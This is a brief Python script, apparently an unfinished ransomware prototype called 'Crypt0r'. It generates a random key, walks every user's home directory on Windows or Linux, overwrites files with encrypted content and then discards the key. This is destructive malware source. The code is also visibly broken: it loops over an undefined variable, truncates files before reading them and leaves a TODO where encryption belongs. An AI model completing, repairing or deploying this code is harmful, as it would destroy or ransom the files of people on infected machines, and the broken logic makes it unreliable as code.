import getdirs
import os
import hashlib as h
import random as r
import time as t
#import urllib.request
import transpositionEncrypt as te 
import transpositionDecrypt as td

def generateKey():
    keyName = "\x43\x72\x79\x70\x74\x30\x72" #Cypt0r in hexString
    salt = map(ord, keyName) # run KeyName through the ord function, set the value to salt
    r.seed(int(t.time()+r.randint(1,1337))) # generate a peusdo random seed for random
    key = h.pbkdf2_hmac('sha512', bytes(r.randint(1, 65500)), bytes(salt), r.randint(30000,60000)) # generate the encryption key - SHA512 salted, ran over a random amount of times
    encryptionKey = key.hex() # dump the key

    return encryptionKey #return it to the main function

def main(encryptionKey):
    
    key = encryptionKey
    if os.name == "nt":
        path = "C:/Users/"
    else:
        path = "/home/"



    files = getdirs.getdirs(path)

        # TODO: encryption
    for files in file:
        f = open(files, "w+")
        encrypted = te.encryptMessage(key,f)
        f.write(encrypted)



    # clear the key out of memory 
    for k in range(1000):
        key = r.randint(1,86400)
        pass




if __name__=="__main__":
    main(generateKey())